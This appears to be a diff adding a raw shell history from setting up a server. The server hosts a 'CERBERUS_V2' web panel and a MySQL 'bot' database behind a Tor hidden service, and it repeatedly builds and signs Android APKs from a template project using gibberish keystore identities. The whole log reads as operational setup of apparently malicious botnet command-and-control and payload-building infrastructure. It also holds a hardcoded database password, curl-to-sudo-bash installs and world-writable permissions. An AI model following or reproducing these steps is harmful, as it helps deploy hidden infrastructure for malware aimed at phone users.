@@ -1,0 +1,249 @@
+APT UPDATE
+sudo apt update
+sudo apt install systemd nginx tor php-fpm mysql-server php php-cli php-xml php-mysql php-curl php-mbstring php-zip unzip -y wget
+touch /lib/systemd/system/tor.service
+nano /lib/systemd/system/tor.service
+sudp apt-get install nano
+sudo apt-get install nano
+nano /lib/systemd/system/tor.service
+rm -rf /usr/share/tor/tor-service-defaults-torrc
+rm -rf /etc/tor/torrc
+touch /etc/tor/torrc
+rm -rf /var/lib/tor/cerberus/
+systemctl daemon-reload
+systemctl restart tor
+find /run/php/ -name 'php7.*-fpm.sock' | head -n 1
+echo "Tor domain: $TORHOSTNAME"echo "Tor domain: $TORHOSTNAME"
+cat /var/lib/tor/cerberus/hostname
+sed -i 's/keepalive_timeout/client_max_body_size 200M;\nkeepalive_timeout/g' /etc/nginx/nginx.conf
+mkdir /var/www/tor
+echo "hi $TORHOSTNAME new website" > /var/www/tor/index.html
+nginx -s reload
+systemctl restart nginx
+systemctl restart tor
+mysql -uroot --password="yArrAk123" -e "CREATE DATABASE bot /*\!40100 DEFAULT CHARACTER SET utf8 */;"
+mysql -uroot --password="yArrAk123" -e "CREATE USER 'non-root'@'localhost' IDENTIFIED BY 'yArrAk123';"
+mysql -uroot --password="yArrAk123" bot < bot.sql
+mysql -uroot --password="yArrAk123" -e "GRANT ALL PRIVILEGES ON *.* TO 'non-root'@'localhost';"
+mysql -uroot --password="yArrAk123" -e "FLUSH PRIVILEGES;"
+rm -rf bot.sql
+mysql -u root -p bot
+sudo apt install wget
+wget http://
+mv CERBERUS_V2.zip /home
+ls
+cd /home
+ls
+unrar e CERBERUS_V2.zip
+sudo apt-get install
+sudo apt-get install unzip
+unzip CERBERUS_V2.zip
+ls
+rm -f -rf CERBERUS_V2.zip
+ls
+cd panel_v2/
+ls
+rm -f -rf node_modules/
+sudo apt install curl
+curl -sL https://deb.nodesource.com/setup_11.x | sudo -E bash -
+curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash -
+sudo apt-get install -y nodejs
+node -version
+node --v
+node -v
+npm -v
+npm install
+npm audit fixz
+npm audit fix
+nupm audit fix --force
+npm audit fix --force
+rm -f -rf build
+npm run build
+cp -R build/. /var/www/tor
+rm -f -rf /var/www/tor
+npm run build && rm -f -rf /var/www/tor && mkdir /var/www/tor && cp -R build/. /var/www/tor
+sudo reboot
+mysql -u root -p lyinx
+mysql -u root -p bot
+cd /home/panel_v2/ && npm run build && rm -f -rf /var/www/tor && mkdir /var/www/tor && cp -R build/. /var/www/tor && cd
+cd /var/www/html/
+ls
+chown -R www-data:www-data /var/www
+chmod -R 777 /var/ww/tor
+chmod -R 777 /var/www/tor
+chmod -R 777 /var/www/html
+chmod -R 777 /home/panel_v2
+mysql -u root -p
+mysql -u root -p bot
+sudo reboot
+service nginx status
+locate .htaccess
+cd /etc/nginx/sites-available
+cat /var/lib/tor/cerberus/hostname
+service nginx restart
+cd /home/panel_v2/ && npm run build && rm -f -rf /var/www/tor && mkdir /var/www/tor && cp -R build/. /var/www/tor && cd
+
+mkdir /sysbig/tmpfile/
+mkdir /sysbig/t
+mkdir /sysbig/
+mkdir /sysbig/tmpfile/
+mkdir /sysbig/tmpfile/3BXcqf9pRjvtL
+mkdir /sysbig/tmpfile/3BXcqf9pRjvtL/mmm
+cd /sysbig/tmpfile/3BXcqf9pRjvtL/mmm
+ls
+chmod -R 777 /sysbig/tmpfile/3BXcqf9pRjvtL/mmm
+ls
+chmod -R 777 /var/www/tor
+chmod -R 777 /sysbig/
+mkdir /sysbig/sourceproject/mmm
+cd /sysbig/sourceproject/mmm
+mkdir /sysbig/sourceproject
+mkdir /sysbig/sourceproject/mmm
+cd /sysbig/sourceproject/mmm
+ls
+sudo rm -R /sysbig/tmpfile/3BXcqf9pRjvtL
+sudo mkdir /sysbig/tmpfile/3BXcqf9pRjvtL
+sudo cp -r /sysbig/sourceproject/mmm /sysbig/tmpfile/3BXcqf9pRjvtL/mmm
+sudo chmod -R 777 /sysbig/tmpfile/3BXcqf9pRjvtL
+cd /sysbig/tmpfile/3BXcqf9pRjvtL/mmm/ && sudo ./gradlew assembleRelease
+sudo apt-get install java
+sudo apt-get install default-jdk
+java -version
+cd /sysbig/tmpfile/3BXcqf9pRjvtL/mmm/ && sudo ./gradlew assembleRelease
+sudo apt update && sudo apt install android-sdk
+cd /sysbig/tmpfile/3BXcqf9pRjvtL/mmm/ && sudo ./gradlew assembleRelease
+cd /home/Android/Sdk
+wget https://dl.google.com/android/repository/sdk-tools-linux-3859397.zip
+unzip sdk-tools-linux-3859397.zip
+ls
+cd ../../
+ls
+rm -f -rf 3BXcqf9pRjvtL/
+cd /home
+wget https://dl.google.com/android/repository/sdk-tools-linux-3859397.zip && unzip sdk-tools-linux-3859397.zip && export PATH=/opt/pradip/tools:/opt/pradip/tools/bin:$PATH
+sdkmanager -list
+export PATH=/opt/pradip/tools:/opt/pradip/tools/bin:$PATH
+cd /opt/gradip/tools/bin
+ls
+tools
+cd tools
+ls
+# create sdk folder
+export ANDROID_HOME=/opt/android-sdk-linux
+sudo mkdir -p $ANDROID_HOME
+# install openjdk
+sudo apt-get install openjdk-8-jdk
+# download android sdk
+cd $ANDROID_HOME
+sudo wget https://dl.google.com/android/repository/tools_r25.2.3-linux.zip
+sudo unzip tools_r25.2.3-linux.zip
+cd tools
+# install all sdk packages
+sudo ./android update sdk --no-ui
+la
+cd /sysbig
+cd /sysbig/tmpfile/3BXcqf9pRjvtL/mmm/app
+chmod -R 777 /var/www/tor
+ls
+chmod -R 777 /sysbig/.
+chmod -R 777 /sysbig/*
+chmod -R 777 /sysbig/
+chmod -R 777 /var/www/tor/* && chmod -R 777 /var/www/tor/. && chmod -R 777 /var/www/tor/
+sudo rm -R /sysbig/tmpfile/3BXcqf9pRjvtL
+sudo mkdir /sysbig/tmpfile/3BXcqf9pRjvtL
+sudo cp -r /sysbig/sourceproject/mmm /sysbig/tmpfile/3BXcqf9pRjvtL/mmm
+sudo chmod -R 777 /sysbig/tmpfile/3BXcqf9pRjvtL
+cd /sysbig/tmpfile/3BXcqf9pRjvtL/mmm/ && sudo ./gradlew assembleRelease
+sdkmanager
+cd /sysbig/tmpfile/3BXcqf9pRjvtL/mmm/ && sudo ./gradlew assembleRelease --info
+locate sdk
+/home/tools/bin/
+cd cD/home/tools/bin//home/tools/bin//home/tools/bin/
+cd /home/tools/bin/sdkmanager
+./home/tools/bin/sdkmanager
+/home/tools/bin/sdkmanager
+/home/tools/bin/sdkmanager --sdk_root /home/Android/sdk
+android list sdk --all
+android list sdk --list
+sdkmanager --list
+/home/tools/bin/sdkmanager --list
+/home/tools/bin/sdkmanager
+/home/tools/bin/sdkmanager platforms;android-27 -sdk_root /home/Android/Sdk
+/home/tools/bin/sdkmanager ' platforms;android-27' -sdk_root /home/Android/Sdk
+/home/tools/bin/sdkmanager 'platforms;android-27' --sdk_root /home/Android/Sdk
+/home/tools/bin/sdkmanager 'platforms;android-27' -sdk_root /home/Android/Sdk
+/home/tools/bin/sdkmanager 'platforms;android-27' --sdk_root /home/Android/Sdk
+/home/tools/bin/sdkmanager 'platforms;android-27'
+cd /home/Android/Sdk
+ls
+cd /home/tools/bin/
+,ls
+ls
+cd sdkmanager
+cd ../
+ls
+locate sdk
+/home/tools/bin/sdkmanager 'platforms;android-27' --sdk_root /home/Android/Sdk
+/home/tools/bin/sdkmanager 'platforms;android-27' --sdk_root=/home/Android/Sdk
+cd /home/Android/Sdk
+ls
+cd platforms
+ls
+cd /sysbig/tmpfile
+ls
+cd 3Bxc
+cd 3BXcqf9pRjvtL/
+ls
+cd mmm
+ls
+sudo ./gradlew assembleRelease
+ls
+rm -f -rf /sysbig/tmpfile/3BXcqf9pRjvtL/
+ls
+chmod -R 777 /var/www
+chown root /var/www
+chown root /sysbig/
+chown -R root /sysbig/
+chown -R root:root /sysbig/
+chown -R root:root /var/www
+chown -R root:root /var/www/**
+chown -R root:root /var/www/
+chown -R root:root /var/www/.
+keytool
+"keytool -genkey -v -keystore
+keytool -genkey -v -keystore
+keytool -genkey -v -keystore /sysbig/tmpfile/3BXcqf9pRjvtL/key -alias key0 -keyalg RSA -keysize 2048 -validity 99999 -storepass 123123 -keypass 123123 -dname \"CN=asdfoayfss7a8ayds7sasffas,O=fsadasfsdasfsad,C=US\
+keytool -genkey -v -keystore /sysbig/tmpfile/3BXcqf9pRjvtL/key -alias key0 -keyalg RSA -keysize 2048 -validity 99999 -storepass 123123 -keypass 123123 -dname CN=asdfoayfss7a8ayds7sasffas,O=fsadasfsdasfsad,C=US
+java -version
+java
+java -version
+java
+sudo apt remove java
+sudo apt install java-jdk
+java
+sudo apt remove java
+avahee
+java
+c
+cd
+sudo apt remove default-jdk
+sud apt-get update
+sudo apt-get update
+sudo apt download default-jdk
+sudo apt install default-jdk
+java
+keytool -genkey -v -keystore /sysbig/tmpfile/3BXcqf9pRjvtL/key -alias key0 -keyalg RSA -keysize 2048 -validity 99999 -storepass 123123 -keypass 123123 -dname CN=asdfoayfss7a8ayds7sasffas,O=fsadasfsdasfsad,C=US
+sudo keytool -genkey -v -keystore /sysbig/tmpfile/3BXcqf9pRjvtL/key -alias key0 -keyalg RSA -keysize 2048 -validity 99999 -storepass 123123 -keypass 123123 -dname CN=asdfoayfss7a8ayds7sasffas,O=fsadasfsdasfsad,C=US
+touch /sysbig/tmpfile/3BXcqf9pRjvtL/key
+/sysbig/tmpfile/3BXcqf9pRjvtL/mmm
+/sysbig/tmpfile/3BXcqf9pRjvtL/mmm/
+cd /sysbig/tmpfile/3BXcqf9pRjvtL/mmm/
+sudo ./gradlew assembleRelease
+./gradlew assembleRelease
+history
+
+sudo keytool -genkey -v -keystore /sysbig/tmpfile/heliades/key -alias key0 -keyalg RSA -keysize 2048 -validity 99999 -storepass 123123 -keypass 123123 -dname CN=asdfoayfss7a8ayds7sasffas,O=fsadasfsdasfsad,C=US
+
+mkdir /sysbig/tmpfile/heliades
+sudo cp -r /sysbig/sourceproject/mmm /sysbig/tmpfile/heliades/mmm
+
